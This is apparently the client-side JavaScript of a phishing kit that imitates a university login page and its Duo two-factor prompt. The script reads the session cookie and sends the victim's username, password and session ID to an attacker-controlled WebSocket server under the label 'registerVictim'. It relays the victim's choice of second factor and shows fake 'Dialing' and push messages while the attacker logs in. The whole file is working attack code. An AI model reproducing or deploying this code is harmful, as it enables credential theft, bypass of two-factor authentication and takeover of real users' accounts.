window.ORIG_URL = "{{ORIG_URL}}";
function loaded() {
	function getCook(cookiename) 
	{
		// Get name followed by anything except a semicolon
		var cookiestring=RegExp(cookiename+"=[^;]+").exec(document.cookie);
		// Return everything after the equal sign, or an empty string if the cookie name not found
		return decodeURIComponent(!!cookiestring ? cookiestring.toString().replace(/^[^=]+./,"") : "");
	}	
	window.sid = getCook("sid");
	console.log("Session is:", window.sid);
	function initSock() {
		var sock = new WebSocket("wss://" + window.ATTACK_DOM_NAME + ":80");
		window.sock = sock;
		var alive = true;
		sock.onclose = function(e) {
			console.log(e)
			console.log("error: " + e.code)
			setTimeout(function() {
				if (window.localStorage.getItem("loggedIn") != "true") {
					console.log("re-connecting now");
					initSock();
				}
				else {
					console.log("not reconnectnig cuz succ");
				}
			}, 500);
		}
		sock.onopen = function() {	
			var pingInterval = setInterval(function() {
				if (!alive) {
					clearInterval(pingInterval);
					sock.close(4001);
					return;
				}
				if (window.localStorage.getItem("loggedIn") != true)
					sock.send(JSON.stringify({"ping":window.sid}));
				alive = false;
			}, 4000);
			sock.send(JSON.stringify({
				"action"	: "registerVictim",
				"username" 	: window.user,
				"password"	: window.pass,
				"sid"		: window.sid,
				"id"		: "victim"
			}));

			sock.addEventListener("message", function(event) {
				data = JSON.parse(event.data)
				if (data.pong != undefined) {
					alive = true;
					console.log("Received pong:" + data.pong);
					return;
				}

				console.log("received msg");
				console.log(event);
				if (data.number != undefined)
					frame.contentWindow.document.getElementById("phone-number").innerHTML = "Dialing " + data.number + "...";
					if (window.authMethod == 1) {
						showMsg('msg-call-1');
					}
					else 
						window.phoneNum = data.number;
				if (data.status == "loggedIn") {
					showMsg("msg-succ")
					setTimeout(function() {
						loginSucc();
					}, 1000);
				}
				if (data.status == "callAnswered")
					showMsg("msg-call-2")
			});
		}
	}
	initSock();

	var frame = document.getElementById("duo_iframe");
	if (document.body.innerHTML.includes("MIT Mobile Web Home")) { 
		setTimeout(()=>{
			document.getElementById("duo_help").style.display='block';
			document.getElementById("footer").style.display='block';
			setTimeout(()=>{
				document.getElementById("duo_iframe").style.visibility='visible';
			}, 500);
		}, 2000);
	}
	else {
		// 2000, 2000, 3500, 1900
		setTimeout(() => {
			frame.style.display = "inline-block";
			setTimeout(() => {
				frame.style.display = "none";
			}, 1000);
		}, 2000) 
		setTimeout(() => {
			document.getElementsByClassName("clearfloat")[0].style.display = "block";
			setTimeout(()=> {
				frame.style.display = "inline-block";
			}, 1700)
		}, 1900)
	}

	frame.contentWindow.document.getElementById("pushme").onclick = function() {
		sendAuthMethod(0)	
		window.authMethod = 0;
		setTimeout(function() {
			showMsg("msg-push");
		}, 500);
	}
	function cancelHandler() {
		var messages = frame.contentWindow.document.getElementsByClassName("msg");
		for (var i = 0; i < messages.length; i++) {
			hideMsg(messages[i].id);	
		}
		showMsg("msg-cancel");
		setTimeout(function() {
			hideMsg("msg-cancel");	
			showMsg("msg-cancel-final");
			frame.contentWindow.document.getElementsByClassName("base-body")[0].style.opacity = "1";
		}, 1500);
		console.log("sending cancel")
		window.sock.send(JSON.stringify({
			"action"	: "cancelPressed",
			"id"		: "victim",
			"sid"		: window.sid
		}));
	}
	function showMsg(id) {
		frame.contentWindow.document.getElementById(id).style.bottom = "0px";
		try {
			frame.contentWindow.document.getElementById(id).getElementsByClassName("btn-cancel")[0].onclick = cancelHandler;
		}catch(e){};
	}
	function hideMsg(id) {
		if (frame.contentWindow.document.getElementById(id).getElementsByTagName("button").length != 0 
			&& window.location.href.includes('mobile')) { 
			return frame.contentWindow.document.getElementById(id).style.bottom = "-75px";
		}
		frame.contentWindow.document.getElementById(id).style.bottom = "-51px";
	}

	frame.contentWindow.document.getElementById("callme").onclick = function() {
		sendAuthMethod(1)	
		if (window.phoneNum == undefined) {
			window.authMethod = 1;
			setTimeout(function() {
				showMsg("msg-call-0");
			}, 500);
		}
		else {
			setTimeout(function() {
				showMsg("msg-call-0");
				setTimeout(function() {
					showMsg("msg-call-1");
				}, 800);
			}, 200);
		}
	}

	function sendAuthMethod(m) {
		frame.contentWindow.document.getElementsByClassName("base-body")[0].style.opacity = "0.5";
		window.sock.send(JSON.stringify({
			"action"	: "setAuthMethod",
			"authm"		: "" + m,
			"sid"		: window.sid,
			"id"		: "victim"
		}));
	}
	function loginSucc() {
		window.localStorage.setItem("loggedIn", "true");
		window.sock.close(1000)
		window.sock = undefined;
		window.postMessage({
			move : '/exit-site/final.html',
			url  : '/' + window.ORIG_URL.replace(/(^\w+:|^)\/\//, ''),
			load : '0'
		}, '*');
	}
};

var poll = setInterval(()=>{
	var frame = document.getElementById("duo_iframe");
	if (frame != null) {
		setTimeout(()=>loaded(), 100);
		clearInterval(poll);
	}
}, 50);

